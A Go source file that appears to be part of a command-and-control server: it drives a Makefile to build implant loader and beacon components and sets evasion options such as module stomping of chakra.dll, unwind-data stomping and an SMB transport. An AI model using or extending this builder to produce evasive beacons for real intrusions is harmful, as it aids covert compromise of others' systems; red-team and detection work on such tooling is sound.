package naxbuilder

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"strings"
)

// Flag constants mirror nax_packer.go.
const (
	flagModStomp  = 0x0001
	flagStompPdat = 0x0002
)

// runMake drives the NaX Makefile. It is a package variable so tests can stub it
// to a no-op; in production it runs `make -C <root> <target> <NAX_*=...>`, which
// needs the mingw/nasm/make toolchain.
var runMake = func(root string, target string, extra map[string]string) error {
	args := []string{"-C", root, target}
	for _, k := range sortedKeys(extra) {
		args = append(args, fmt.Sprintf("%s=%s", k, extra[k]))
	}
	cmd := exec.Command("make", args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	return cmd.Run()
}

// selectMakeTarget maps req onto the NaX Makefile "component-only" targets, which
// rebuild only the loader + beacon component files (the final pack is done in Go,
// so we never run the Makefile's combined-output pack step).
func selectMakeTarget(req *NaxBuildRequest) string {
	if req.Debug {
		if req.FullRebuild {
			return "debug-link-components"
		}
		return "debug-components"
	}
	if req.FullRebuild {
		return "link-components"
	}
	return "components"
}

// makeArgs builds the NAX_* make variables from req, matching the NaX Makefile's
// "component-only" section. Note the Makefile's own (intentional) "STUMP"
// spelling of STOMP in NAX_STUMP_MODE / NAX_STUMP_ADVANCED.
func makeArgs(req *NaxBuildRequest) map[string]string {
	return map[string]string{
		"NAX_TRANSPORT_PROFILE": bool10(req.Transport == "smb"),
		"NAX_STUMP_MODE":        bool10(req.StompMode),
		"NAX_EXEC_MODE":         bool10(req.ThreadPool),
		"NAX_STUMP_ADVANCED":    bool10(req.StompAdv),
		"MODULE_STOMP":          bool10(req.StompMode),
		"STOMP_PDATA":           bool10(req.StompUnwind),
		"STOMP_DLL":             firstNonEmpty(req.StompDll, "chakra.dll"),
	}
}

// BuildComponents runs the component-only make target and reads the component
// files, returning a NaxBuildResponse with the raw component bytes plus
// size/sha256/flags. The server later repacks these via packNaxBin.
func BuildComponents(root string, req *NaxBuildRequest) (*NaxBuildResponse, error) {
	if err := req.Validate(); err != nil {
		return nil, err
	}

	target := selectMakeTarget(req)
	if err := runMake(root, target, makeArgs(req)); err != nil {
		return nil, fmt.Errorf("make %s: %w", target, err)
	}

	comps, err := readComponents(root, req)
	if err != nil {
		return nil, err
	}

	resp := &NaxBuildResponse{
		Filename:   ComponentPath(req.Transport, req.Debug, "beacon"),
		Components: comps,
		Flags:      fmt.Sprintf("0x%04x", flags(req)),
		StompDll:   firstNonEmpty(req.StompDll, "chakra.dll"),
	}
	return finalize(resp), nil
}

// readComponents reads loader + beacon + pdata + xdata + textRva via ComponentPath.
// All five are always read — the server repacker keys off these component names.
func readComponents(root string, req *NaxBuildRequest) (map[string][]byte, error) {
	comps := map[string][]byte{}
	var firstErr error
	for _, name := range []string{"loader", "beacon", "pdata", "xdata", "textRva"} {
		rel := ComponentPath(req.Transport, req.Debug, name)
		if rel == "" {
			continue
		}
		b, err := os.ReadFile(filepath.Join(root, rel))
		if err != nil {
			if firstErr == nil {
				firstErr = fmt.Errorf("component %q: %w", name, err)
			}
			continue
		}
		comps[name] = b
	}
	if firstErr != nil {
		return nil, firstErr
	}
	return comps, nil
}

// finalize computes Size + SHA256 over a canonical (ordered) concatenation of the
// component bytes.
func finalize(resp *NaxBuildResponse) *NaxBuildResponse {
	var b strings.Builder
	for _, name := range []string{"loader", "beacon", "pdata", "xdata", "textRva"} {
		if data, ok := resp.Components[name]; ok {
			b.Write(data)
		}
	}
	sum := sha256.Sum256([]byte(b.String()))
	resp.SHA256 = hex.EncodeToString(sum[:])
	resp.Size = b.Len()
	return resp
}

// flags computes the packer flags bitfield (matches pl_build_payload.go).
func flags(req *NaxBuildRequest) uint32 {
	var f uint32
	if req.StompMode {
		f |= flagModStomp
	}
	if req.StompUnwind {
		f |= flagStompPdat
	}
	return f
}

func bool10(b bool) string {
	if b {
		return "1"
	}
	return "0"
}

func firstNonEmpty(vals ...string) string {
	for _, v := range vals {
		if v != "" {
			return v
		}
	}
	return ""
}

func sortedKeys(m map[string]string) []string {
	keys := make([]string, 0, len(m))
	for k := range m {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	return keys
}
